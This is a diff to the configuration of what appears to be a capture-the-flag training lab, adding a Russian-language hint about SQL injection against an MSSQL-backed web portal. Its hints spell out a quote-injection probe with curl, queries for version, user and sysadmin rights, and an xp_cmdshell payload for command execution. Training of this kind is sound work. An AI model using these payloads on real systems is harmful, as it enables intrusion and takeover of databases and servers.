@@ -21,6 +21,7 @@ lab:
   files: [task.md]
   check: 'grep -q ''nto{'' found.txt'
   hints:
+    - "Повторение (`web-sqli`): сначала фингерпринт — `curl -s \"http://portal.example/user?id=1'\"`; `Unclosed quotation mark` = MSSQL."
     - 'Диалект: `curl -s "http://portal.example/user?id=1''"` — `Unclosed quotation mark`.'
     - 'Версия и пользователь: `@@version`, `system_user`; права — `is_srvrolemember(''sysadmin'')`.'
     - 'RCE: `id=1;EXEC xp_cmdshell ''whoami''-- -`.'
